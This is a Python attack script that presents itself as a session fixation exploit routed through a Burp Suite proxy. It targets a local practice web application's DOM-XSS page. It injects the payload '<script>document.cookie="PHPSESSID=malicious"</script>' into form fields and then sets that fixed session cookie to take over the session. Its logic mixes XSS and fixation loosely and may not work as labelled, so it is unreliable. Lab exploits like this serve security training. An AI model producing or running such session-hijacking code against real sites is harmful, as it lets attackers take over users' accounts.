# Session Fixation Attack Exploit with Burp Suite and Python
# Session Fixation is a vulnerability that allows adversaries to hijack a valid user session.
# Burp Suite is a penetration testing tool often used to analyze and exploit web vulnerabilities.
# This script is designed to target http://127.0.0.1/vulnerabilities/xss_d/

import requests
from bs4 import BeautifulSoup

class BurpSuiteSessionHijacker:
    def __init__(self):
        self.target_url = "http://127.0.0.1/vulnerabilities/xss_d/"
        self.session = requests.Session()
        self.burpsuite_proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

    def get_session_cookies(self):
        response = self.session.get(self.target_url, proxies=self.burpsuite_proxy, verify=False)
        cookies = response.cookies
        print(f"Initial Cookies: {cookies}")
        return cookies

    def set_malicious_session(self, fixed_cookie_value):
        self.session.cookies.set("PHPSESSID", fixed_cookie_value)
        print(f"Set Malicious Session Cookie: PHPSESSID={fixed_cookie_value}")

    def get_vulnerable_page(self):
        response = self.session.get(self.target_url, proxies=self.burpsuite_proxy, verify=False)
        if response.status_code == 200:
            print("Successfully obtained the vulnerable page.")
            return response.text
        return None

    def exploit_xss_vulnerability(self, payload):
        page_content = self.get_vulnerable_page()
        if page_content:
            soup = BeautifulSoup(page_content, 'html.parser')
            forms = soup.find_all("form")
            for form in forms:
                action = form.get('action')
                inputs = form.find_all('input')
                data = {}
                for input_tag in inputs:
                    name = input_tag.get('name')
                    if name is None:
                        continue
                    data[name] = payload if name.lower() == 'xss_input' else input_tag.get('value', '')
                form_url = self.target_url.split("/vulnerabilities")[0] + action
                self.session.post(form_url, data=data, proxies=self.burpsuite_proxy, verify=False)
                print("Exploited XSS vulnerability with payload.")

    def hijack_session(self, new_cookie_value):
        self.set_malicious_session(new_cookie_value)
        self.get_vulnerable_page()

def main():
    attacker = BurpSuiteSessionHijacker()
    initial_cookies = attacker.get_session_cookies()
    payload = '<script>document.cookie="PHPSESSID=malicious"</script>'
    attacker.exploit_xss_vulnerability(payload)
    attacker.hijack_session("malicious")

if __name__ == "__main__":
    main()
